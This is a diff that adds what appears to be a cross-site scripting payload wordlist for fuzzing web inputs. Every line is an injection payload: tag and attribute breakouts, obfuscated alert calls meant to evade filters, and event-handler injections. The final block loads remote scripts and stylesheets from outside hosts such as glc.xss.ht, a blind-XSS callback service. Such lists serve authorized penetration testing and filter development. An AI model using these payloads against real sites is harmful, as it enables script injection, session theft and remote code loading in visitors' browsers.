@@ -1,0 +1,119 @@
+'"><svg onload=alert(1)>
+'"><svg onload=alert(1)//
+'"onmouseover=alert(1)//
+'"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+\"-alert(1)//
+</script><svg onload=alert(1)>
+'"><svg onload=alert&lpar;1&rpar;>
+'"><svg onload=alert&#x28;1&#x29>
+'"><svg onload=alert&#40;1&#41>
+'"><svg onload=top.onerror=alert;throw'1'>
+'"><svg onload=top.onerror=alert;throw[1]>
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top['al\145rt'](1)
+top['al\x65rt'](1)
+top[8680439..toString(30)](1)
+eval(atob('YWxlcnQoMSk7));//
+eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41,59));//
+(function(){alert(1);})();//
+this[Object["keys"](this)[146]](1)
+this[Object["keys"](this)[5]](1)
+" onload=alert(1)>
+" onloadstart=alert(1)>
+" onshow=alert(1)>
+" onpageshow=alert(1)>
+" onfocus=alert(1)>
+" onhashchange=alert(1)>
+" onscroll=alert(1)>
+" onstart=alert(1)>
+" onfinish=alert(1)>
+" onblur=alert(1)>
+" onsubmit=alert(1)>
+" onchange=alert(1)>
+'"><SCRİPT/SRC=data:,alert(1)>
+'"><script>alert(1)//
+'"><script>alert(1)<!–
+'"><x onxxx=alert(1) 1='
+'"onload=alert(1)><svg/1='
+'">alert(1)</script><script/1=' 
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1=' 
+*/</script>'>alert(1)/*<script/1='
+p=<svg/1='&q='onload=alert(1)>
+p=<svg 1='&q='onload='/*&r=*/alert(1)'>
+'"><script>alert(1)</script>
+'"><script src=javascript:alert(1)>
+'"><iframe src=javascript:alert(1)>
+'"><embed src=javascript:alert(1)>
+'"><iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+'"><svg><script xlink:href=data:,alert(1) />
+'"><math><brute xlink:href=javascript:alert(1)>click
+'"><svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+'"><svg><x><script>alert(1)</x>
+'"><svg><use xlink:href='data:image/svg+xml,<svg id="x" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+'"><embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)"/></svg>#x'>
+'"><script src="data:&comma;alert(1)//
+'"><script src=data:&comma;alert(1)//
+'"><script src="//brutelogic.com.br&sol;1.js&num;
+'"><script src=//brutelogic.com.br&sol;1.js&num;
+'"><link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
+'"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+'"><img src=1 onerror=alert(1)>
+'"><svg onload=eval(URL.slice(-8))>#alert(1)
+'"><svg onload=eval(location.hash.slice(1)>#alert(1)
+'"><svg onload=innerHTML=location.hash>#<script>alert(1)</script>
+</script>"-alert(1)-"><svg onload=';alert(1);'>
+#//3334957647/0/?0=">"<img src='-alert(1)-' onerror=";alert(1);">
+'"><img src="x" onerror="alert(1)">
+'"><iframe src="javascript:alert(1)">
+'"><img/src="x"onerror="alert(1)">
+'"><object><param name="src" value="javascript:alert(1)"></param></object> 
+'"><object data="javascript:alert(1)">
+'"><isindex type=image src=1 onerror=alert(1)>
+'"><isindex action=javascript:alert(1) type=image>
+'"><img src=x:alert(alt) onerror=eval(src) alt=0>
+'"><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert('xss');</x:script>
+'"><b/alt="1"onmouseover=InputBox+1language=vbs>test</b>
+'"></a onmousemove="alert(1)">
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==
+'"><script+&injection=>alert(1)></script>
+'"><script>var m=<html><a href=”//site”>link</a></html></script>
+'"><html><title>{alert('xss')}</title></html>
+%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
+'"><img src="x:ö" title="onerror=alert(1)//">
+'"><img src="x:alert" onerror="eval(src%2b'(1)')">
+'"><img src="x:gif" onerror="eval('al'%2b'lert(1)')">
+'"><img src="x:gif" onerror="window['al\u0065rt'](1)"></img>
+";document.write('<img src=x onerror=alert(1)>');"
+";document.write('<img sr'%2b'c=x onerror=alert(1)>');"
+%22%27%20Style=position:fixed;top:0;left:0;font-size:999px;%20OnMouseEnter=confirm`1`%20//#
+'"><b "<script>alert(1)</script>">hola</b> 
+'"><SCRIPT/XSS SRC="https://glc.xss.ht"></SCRIPT>
+'"><SCRIPT/SRC="https://glc.xss.ht"></SCRIPT>
+'"><SCRIPT SRC=https://glc.xss.ht?< B >
+'"><SCRIPT SRC=//glc.xss.ht/.j>
+'"><iframe src=http://glc.xss.ht/scriptlet.html <
+'"><LINK REL="stylesheet" HREF="http://glc.xss.ht/xss.css">
+'"><STYLE>@import'http://glc.xss.ht/xss.css';</STYLE>
+'"><META HTTP-EQUIV="Link" Content="<http://glc.xss.ht/xss.css>; REL=stylesheet">
+'"><STYLE>BODY{-moz-binding:url("http://glc.xss.ht/xssmoz.xml#xss")}</STYLE>
+'"><OBJECT TYPE="text/x-scriptlet" DATA="http://glc.xss.ht/scriptlet.html"></OBJECT>
+'"><SCRIPT SRC="http://glc.xss.ht/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=https://glc.xss.ht></SCRIPT>'"-->
+'"><SCRIPT a=">" SRC="https://glc.xss.ht"></SCRIPT>
+'"><SCRIPT =">" SRC="https://glc.xss.ht"></SCRIPT>
+'"><SCRIPT a=">" '' SRC="https://glc.xss.ht"></SCRIPT>
+'"><SCRIPT "a='>'" SRC="https://glc.xss.ht"></SCRIPT>
+'"><SCRIPT a=`>` SRC="https://glc.xss.ht"></SCRIPT>
+'"><SCRIPT a=">'>" SRC="https://glc.xss.ht"></SCRIPT>
+'"><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://glc.xss.ht"></SCRIPT>
+'">&lt;SCRIPT SRC=https://glc.xss.ht&gt;&lt;/SCRIPT&gt;
